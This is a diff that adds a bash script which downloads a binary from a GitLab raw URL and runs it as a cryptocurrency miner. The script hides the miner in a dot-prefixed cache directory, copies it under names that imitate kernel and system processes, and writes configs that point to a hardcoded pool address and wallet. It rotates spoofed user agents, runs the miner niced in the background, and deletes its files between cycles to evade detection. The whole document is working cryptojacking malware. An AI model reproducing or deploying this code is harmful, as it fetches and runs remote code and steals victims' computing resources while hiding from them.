@@ -1,0 +1,100 @@
+#!/usr/bin/env bash
+
+BIN_URL="https://gitlab.com/notesss2/filess/-/raw/main/sumo"
+BIN_NAME_ORI="sys-helper"
+WORKDIR="$HOME/.cache/.system_helper"
+
+RUNTIME=600
+
+MIN_SLEEP=30
+MAX_SLEEP=40
+
+POOL="18.117.179.13:443"
+WALLET="v2df0zlb7dqvmbpr3uq7jbeaucbijily6cgcpl0ckswlh"
+
+THREAD_LIST=(2 3 4)
+
+
+UA_LIST=(
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
+    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0"
+    "Spotify/8.8.44 (Windows NT 10.0; Win64; x64)"
+    "iTunes/12.10.9 (Windows; Microsoft Windows 10 x64 Business Edition (Build 19041); x64) AppleWebKit/7607.3.18.0.2"
+)
+
+ALIAS_BIN_LIST=(
+    ".dbus-daemon" ".ksoftirqd" ".systemd-update" ".svc-runner"
+    ".profile-cache" ".netd-helper" ".rcu_sync" ".sessiond"
+    ".jbd2flush" ".logrotate" ".udevworker" ".cron.cleaner"
+)
+
+CONFIG_LIST=(
+    "sys.conf" "cache.conf" "net.conf" "runtime.conf"
+    "session.json" "prefs.json" "service.json" "helper.json"
+    "profile.json" "data.json" "daemon.json" "worker.json"
+)
+
+generate_random_suffix() {
+    cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 12 | head -n 1
+}
+
+mkdir -p "$WORKDIR"
+cd "$WORKDIR" || exit
+
+if [ ! -f "$BIN_NAME_ORI" ]; then
+    curl -sL "$BIN_URL" -o "$BIN_NAME_ORI"
+    chmod +x "$BIN_NAME_ORI"
+fi
+
+while true; do
+    THREADS=${THREAD_LIST[$RANDOM % ${#THREAD_LIST[@]}]}
+    
+    PAUSE=$((RANDOM % (MAX_SLEEP - MIN_SLEEP + 1) + MIN_SLEEP))
+
+    UA=${UA_LIST[$RANDOM % ${#UA_LIST[@]}]}
+    BASE_ALIAS_BIN=${ALIAS_BIN_LIST[$RANDOM % ${#ALIAS_BIN_LIST[@]}]}
+    BASE_CONFIG_NAME=${CONFIG_LIST[$RANDOM % ${#CONFIG_LIST[@]}]}
+    
+    RANDOM_SUFFIX=$(generate_random_suffix)
+    ALIAS_BIN="${BASE_ALIAS_BIN}/${RANDOM_SUFFIX}"
+    CONFIG_NAME="${BASE_CONFIG_NAME%.*}/${RANDOM_SUFFIX}.${BASE_CONFIG_NAME##*.}"
+
+    # Buat directory untuk alias bin jika belum ada
+    mkdir -p "$(dirname "$ALIAS_BIN")"
+    mkdir -p "$(dirname "$CONFIG_NAME")"
+
+    cp "$BIN_NAME_ORI" "$ALIAS_BIN"
+    chmod +x "$ALIAS_BIN"
+
+    cat > "$CONFIG_NAME" << EOF
+{
+  "api": {
+    "worker-id": "$WORKER"
+  },
+  "autosave": true,
+  "pools": [
+    {
+      "url": "$POOL",
+      "user": "$WALLET",
+      "pass": "system",
+      "keepalive": true,
+      "tls": true
+    }
+  ],
+  "user-agent": "$UA",
+  "threads": $THREADS
+}
+EOF
+
+    nohup nice -n 15 timeout "$RUNTIME" ./"$ALIAS_BIN" -c "$CONFIG_NAME" >/dev/null 2>&1 &
+    sleep "$RUNTIME"
+
+    sleep "$PAUSE"
+
+    rm -f "$ALIAS_BIN" "$CONFIG_NAME"
+    # Hapus directory jika kosong
+    rmdir "$(dirname "$ALIAS_BIN")" 2>/dev/null || true
+    rmdir "$(dirname "$CONFIG_NAME")" 2>/dev/null || true
+done
